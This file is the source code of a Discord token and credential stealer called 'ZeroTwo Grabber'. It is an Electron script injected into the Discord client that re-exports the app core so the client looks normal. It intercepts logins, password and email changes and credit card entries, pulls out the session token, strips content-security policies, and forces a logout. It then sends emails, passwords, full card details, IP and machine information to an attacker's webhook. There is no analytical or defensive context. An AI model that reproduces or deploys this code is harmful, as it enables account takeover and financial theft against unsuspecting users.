const fs = require('fs');
const {
    BrowserWindow,
    session,
    app
} = require('electron')
const querystring = require('querystring');
const os = require('os')
var webhook = "%WEBHOOK%";
const computerName = os.hostname();
const discordInstall = `${__dirname.split("\\")[5]} | ${__dirname.split("\\")[6]}`

function firstRun() {
    fs.readdir(__dirname, (err, data) => {
        if (data.includes("Tomori.txt")) return true
        else {
            fs.writeFile(`${__dirname}/Tomori.txt`, "i", err => {
                if (err) {}
            })
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript("function logOut(){setInterval(()=>document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token='``',10),setTimeout(()=>location.reload(),10)}logOut();", true);
            return false
        }
    })
}
const Filter = {
    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (firstRun())
        if (details.url.startsWith("wss://")) callback({ cancel: true })
        else callback({ cancel: false })
})
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook.split('/')[2])) callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Origin': "*",
                "Access-Control-Allow-Headers": "*"
            }
        })
    else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];
        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }
})
const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, true).then(token => Login(email, password, token))
        }
    }
    if (details.url.endsWith("users/@me")) {
        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, true).then((token => {
                        ChangePassword(data.password, data.new_password, token)
                    }))
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, true).then((token => {
                        ChangeEmail(data.email, data.password, token)
                    }))
                }
            }
        } else {}
    }
    if (details.url.endsWith("tokens")) {
        const window = BrowserWindow.getAllWindows()[0];
        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
        window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, true).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
        }))
    }
});
function SendToWebhook(send) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    fetch("${webhook}", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*"
        },
        body: JSON.stringify(${send})
    })`, true)
}

function GetNitro(flags) {
    if (flags == 0) return "𝐃𝐨𝐧'𝐭 𝐇𝐚𝐯𝐞 𝐍𝐢𝐭𝐫𝐨"
    if (flags == 1) return "𝐍𝐢𝐭𝐫𝐨 𝐂𝐥𝐚𝐬𝐬𝐢𝐜`"
    if (flags == 2) return "𝐍𝐢𝐭𝐫𝐨 𝐁𝐨𝐨𝐬𝐭"
    else return "𝐃𝐨𝐧'𝐭 𝐇𝐚𝐯𝐞 𝐍𝐢𝐭𝐫𝐨"
    
}

function GetRBadges(flags) {
    var badges = "";
    if ((flags & 1) == 1) badges += "𝐒𝐭𝐚𝐟𝐟: ";
    if ((flags & 2) == 2) badges += "𝐏𝐚𝐫𝐭𝐧𝐞𝐫: ";
    if ((flags & 4) == 4) badges += "𝐇𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝 𝐄𝐯𝐞𝐧𝐭: "
    if ((flags & 8) == 8) badges += "𝐆𝐫𝐞𝐞𝐧 𝐁𝐮𝐠𝐡𝐮𝐧𝐭𝐞𝐫: ";
    if ((flags & 512) == 512) badges += "𝐄𝐚𝐫𝐥𝐲 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐫: ";
    if ((flags & 16384) == 16384) badges += "𝐆𝐨𝐥𝐝 𝐁𝐮𝐠𝐇𝐮𝐧𝐭𝐞𝐫: ";
    if ((flags & 131072) == 131072) badges += "𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: ";
    if (badges == "") badges = ""
    return badges;
}
function GetBadges(flags) {
    var badges = "";
    if ((flags & 1) == 1) badges += "𝐒𝐭𝐚𝐟𝐟,";
    if ((flags & 2) == 2) badges += "𝐏𝐚𝐫𝐭𝐧𝐞𝐫,";
    if ((flags & 4) == 4) badges += "𝐇𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝 𝐄𝐯𝐞𝐧𝐭,"
    if ((flags & 8) == 8) badges += "𝐆𝐫𝐞𝐞𝐧 𝐁𝐮𝐠𝐡𝐮𝐧𝐭𝐞𝐫,";
    if ((flags & 64) == 64) badges += "𝐇𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝 𝐁𝐫𝐚𝐯𝐞𝐫𝐲,";
    if ((flags & 128) == 128) badges += "𝐇𝐲𝐩𝐞𝐒𝐪𝐮𝐚𝐝 𝐁𝐫𝐢𝐥𝐥𝐚𝐧𝐜𝐞,";
    if ((flags & 256) == 256) badges += "𝐇𝐲𝐩𝐞𝐒𝐪𝐮𝐚𝐝 𝐁𝐚𝐥𝐚𝐧𝐜𝐞,";
    if ((flags & 512) == 512) badges += "𝐄𝐚𝐫𝐥𝐲 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐫,";
    if ((flags & 16384) == 16384) badges += "𝐆𝐨𝐥𝐝 𝐁𝐮𝐠𝐇𝐮𝐧𝐭𝐞𝐫,";
    if ((flags & 131072) == 131072) badges += "𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫,";
    if (badges == "") badges = ""
    return badges;
}
function CalcFriends(f) {
    const r = f.filter((user) => {
        return user.type == 1
    })
    var gay = "";
    for (z of r) {
        var b = GetRBadges(z.user.public_flags)
        if (b != "") gay += b + `${z.user.username}#${z.user.discriminator}\n`
    }
    if (gay == "") gay = "𝐍𝐨 𝐁𝐚𝐝𝐠𝐞𝐝 𝐅𝐫𝐢𝐞𝐧𝐝"
    return gay
}
function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discord.com/api/v8/users/@me", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then((info) => {
        window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://www.myexternalip.com/raw", false );
        XML.send( null );
        XML.responseText;
    `, true).then((ip) => {
            window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        XML.setRequestHeader("Authorization", "${token}");
        XML.send( null );
        XML.responseText`, true).then((info3) => {
                window.webContents.executeJavaScript(`
            var XML = new XMLHttpRequest();
            XML.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            XML.setRequestHeader("Authorization", "${token}");
            XML.send( null );
            XML.responseText`, true).then((info4) => {
                    window.webContents.executeJavaScript(`
                var XML = new XMLHttpRequest();
                XML.open( "GET", "https://discord.com/api/v9/users/@me/guilds", false );
                XML.setRequestHeader("Authorization", "${token}");
                XML.send( null );
                XML.responseText`, true).then((info5) => {
                        window.webContents.executeJavaScript(`
            var XML = new XMLHttpRequest();
        XML.open( "GET", "https://discord.com/api/v9/applications", false );
        XML.setRequestHeader("Authorization", "${token}");
        XML.send();
        XML.responseText;`, true).then(info6 => {
                            var f = JSON.parse(info4)
                            var json = JSON.parse(info);
                            function PaymentMethod() {
                                var billing = "";
                                const billing = JSON.parse(info3)
                                billing.forEach(billing => {
                                    if (billing.type == "") return "❌ 𝐀𝐧𝐲 𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐈𝐧𝐟𝐨𝐬."
                                    else if (billing.type == 1) billing += "✔️ 𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝"
                                    else if (billing.type == 2) billing += "✔️ 𝐏𝐚𝐲𝐩𝐚𝐥"
                                    else return "❌ 𝐀𝐧𝐲 𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐈𝐧𝐟𝐨𝐬."
                                })
                                if (billing == "") billing = "❌ 𝐀𝐧𝐲 𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐈𝐧𝐟𝐨𝐬."
                                return billing
                            }
                            if (json.banner) var img = `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.gif?size=512`
                            else var img = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
                            var params = {
                                username: "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫",
                                content: "",
                                embeds: [{
                                    "title": "𝐍𝐞𝐰 𝐔𝐬𝐞𝐫 𝐆𝐫𝐚𝐛𝐛𝐞𝐝",
                                    "avatar_url": "https://data.whicdn.com/images/346110457/original.gif",
                                    "color": 43690,
                                    "fields": [{
                                            "name": "𝐔𝐬𝐞𝐫𝐍𝐚𝐦𝐞: ",
                                            "value": "```" + `${json.username}#${json.discriminator}` + "```"
                                        }, {
                                            "name": "𝐈𝐃: ",
                                            "value": "```" + `${json.id}` + "```"
                                        }, {
                                            "name": "𝐁𝐚𝐝𝐠𝐞𝐬: ",
                                            "value": "```" + `${GetBadges(json.flags)}` + "```"
                                        }, {
                                            "name": "𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐈𝐧𝐟𝐨𝐬 ?: ",
                                            "value": "```" + `${PaymentMethod()}` + "```"
                                        }, {
                                            "name": "𝐅𝐑𝐈𝐄𝐍𝐃𝐒: ",
                                            "value": "```" + f.length + "```\n```" + CalcFriends(f) + "```"
                                        }, {
                                            "name": "𝐆𝐮𝐢𝐥𝐝 𝐍𝐮𝐦𝐛𝐞𝐫: ",
                                            "value": "```" + JSON.parse(info5).length + "```"
                                        }, {
                                            "name": "𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬 𝐍𝐮𝐦𝐛𝐞𝐫: ",
                                            "value": "```" + JSON.parse(info6).length + "```"
                                        }, {
                                            "name": "𝐄𝐌𝐀𝐈𝐋:  ",
                                            "value": "```" + email + "```"
                                        }, {
                                            "name": "𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ",
                                            "value": "```" + password + "```"
                                        }, {
                                            "name": "𝐓𝐎𝐊𝐄𝐍: ",
                                            "value": "```" + token + "```"
                                        }, {
                                            "name": "𝐈𝐏: ",
                                            "value": "```" + ip + "```"
                                        }, {
                                            "name": "𝗣𝗖 𝗜𝗡𝗙𝗢: ",
                                            "value": "```" + os.cpus()[0].model + "```\n𝐀𝐃𝐃𝐑𝐄𝐒𝐒:\n```" + os.networkInterfaces()["Wi-Fi"][3].address + "```\n𝐀𝐃𝐃𝐑𝐄𝐒𝐒 𝐌𝐀𝐂: \n```" + os.networkInterfaces()["Wi-Fi"][3].mac + "```\n𝐌𝐄𝐌𝐎𝐑𝐘 𝐔𝐒𝐀𝐆𝐄:\n```" + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + 'MB / ' + (os.totalmem() / 1024 / 1024).toFixed(2) + " MB" + "```\n𝐇𝐎𝐌𝐄𝐃𝐈𝐑: \n```" + os.homedir() + "```\n𝐏𝐋𝐀𝐓𝐅𝐎𝐑𝐌: \n```" + os.platform() + "```\n𝐇𝐎𝐒𝐓𝐍𝐀𝐌𝐄: \n```" + os.hostname() + "```"
                                        },{
                                            "name": "𝐈𝐍𝐉𝐄𝐂𝐓𝐄𝐃 𝐈𝐍:",
                                            value: "```" + __dirname + "```"
                                        }
                                    ],
                                    "author": {
                                        "name": '!"𝐍𝐨𝐭.𝐅𝐮𝐛𝐮𝐤𝐢𝐢 †#0069',
                                        "url": "https://pornhub.com",
                                        "avatar_url": "https://cdn.discordapp.com/avatars/276357866217013249/a_39431cb21481bc2d3fed5ab2d6ef55a9.png?size=16"
                                    },
                                    "footer": {
                                        "text": "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫"
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.gif?size=128`
                                    },
                                    "image": {
                                        "url": img
                                    }
                                }]
                            }
                            SendToWebhook(JSON.stringify(params))
                        })
                    })
                })
            })
        })
    })
}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discord.com/api/v8/users/@me", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then((info) => {
        window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://www.myexternalip.com/raw", false );
        XML.send( null );
        XML.responseText;
    `, true).then((ip) => {
            window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        XML.setRequestHeader("Authorization", "${token}");
        XML.send( null );
        XML.responseText`, true).then((info3) => {
                function Cool() {
                    const json = JSON.parse(info3)
                    var billing = "";
                    json.forEach(z => {
                        if (z.type == "") {
                            return "\`❌\`"
                        } else if (z.type == 2 && z.invalid != true) {
                            billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                        } else if (z.type == 1 && z.invalid != true) {
                            billing += "\`✔️\`" + " :credit_card:"
                        } else {
                            return "\`❌\`"
                        }
                    })
                    if (billing == "") {
                        billing = "\`❌\`"
                    }
                    return billing
                }
                const json = JSON.parse(info);
                var params = {
                    username: "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫",
                    content: "",
                    embeds: [{
                        "title": "Password Changed",
                        "color": 3447704,
                        "fields": [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
                            inline: false
                        }, {
                            name: "Username",
                            value: `\`${json.username}#${json.discriminator}\``,
                            inline: true
                        }, {
                            name: "ID",
                            value: `\`${json.id}\``,
                            inline: true
                        }, {
                            name: "Nitro",
                            value: `${GetNitro(json.premium_type)}`,
                            inline: false
                        }, {
                            name: "Badges",
                            value: `${GetBadges(json.flags)}`,
                            inline: false
                        }, {
                            name: "Billing",
                            value: `${Cool()}`,
                            inline: false
                        }, {
                            name: "Email",
                            value: `\`${json.email}\``,
                            inline: false
                        }, {
                            name: "Old Password",
                            value: `\`${oldpassword}\``,
                            inline: true
                        }, {
                            name: "New Password",
                            value: `\`${newpassword}\``,
                            inline: true
                        }, {
                            name: "Token",
                            value: `\`\`\`${token}\`\`\``,
                            inline: false
                        }, ],
                        "author": {
                            "name": "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫"
                        },
                        "footer": {
                            "text": "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫"
                        },
                        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                        }
                    }]
                }
                SendToWebhook(JSON.stringify(params))
            })
        })
    })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discord.com/api/v8/users/@me", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then((info) => {
        window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://www.myexternalip.com/raw", false );
        XML.send( null );
        XML.responseText;
    `, true).then((ip) => {
            window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        XML.setRequestHeader("Authorization", "${token}");
        XML.send( null );
        XML.responseText`, true).then((info3) => {
                function Cool() {
                    const json = JSON.parse(info3)
                    var billing = "";
                    json.forEach(z => {
                        if (z.type == "") {
                            return "\`❌\`"
                        } else if (z.type == 2 && z.invalid != true) {
                            billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                        } else if (z.type == 1 && z.invalid != true) {
                            billing += "\`✔️\`" + " :credit_card:"
                        } else {
                            return "\`❌\`"
                        }
                    })
                    if (billing == "") {
                        billing = "\`❌\`"
                    }
                    return billing
                }
                const json = JSON.parse(info);
                var params = {
                    username: "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫",
                    content: "",
                    embeds: [{
                        "title": "Email Changed",
                        "color": 3447704,
                        "fields": [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
                            inline: false
                        }, {
                            name: "Username",
                            value: `\`${json.username}#${json.discriminator}\``,
                            inline: true
                        }, {
                            name: "ID",
                            value: `\`${json.id}\``,
                            inline: true
                        }, {
                            name: "Nitro",
                            value: `${GetNitro(json.premium_type)}`,
                            inline: false
                        }, {
                            name: "Badges",
                            value: `${GetBadges(json.flags)}`,
                            inline: false
                        }, {
                            name: "Billing",
                            value: `${Cool()}`,
                            inline: false
                        }, {
                            name: "New Email",
                            value: `\`${newemail}\``,
                            inline: true
                        }, {
                            name: "Password",
                            value: `\`${password}\``,
                            inline: true
                        }, {
                            name: "Token",
                            value: `\`\`\`${token}\`\`\``,
                            inline: false
                        }, ],
                        "author": {
                            "name": "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫"
                        },
                        "footer": {
                            "text": "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫"
                        },
                        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                        }
                    }]
                }
                SendToWebhook(JSON.stringify(params))
            })
        })
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discord.com/api/v8/users/@me", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then((info) => {
        window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://www.myexternalip.com/raw", false );
        XML.send( null );
        XML.responseText;
    `, true).then((ip) => {
            var json = JSON.parse(info);
            var params = {
                username: "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫",
                content: "",
                embeds: [{
                    "title": "User Credit Card Added",
                    "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
                    "author": {
                        "name": "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫"
                    },
                    "footer": {
                        "text": "𝐙𝐞𝐫𝐨𝐓𝐰𝐨 𝐆𝐫𝐚𝐛𝐛𝐞𝐫"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
                    }
                }]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}
module.exports = require('./core.asar')
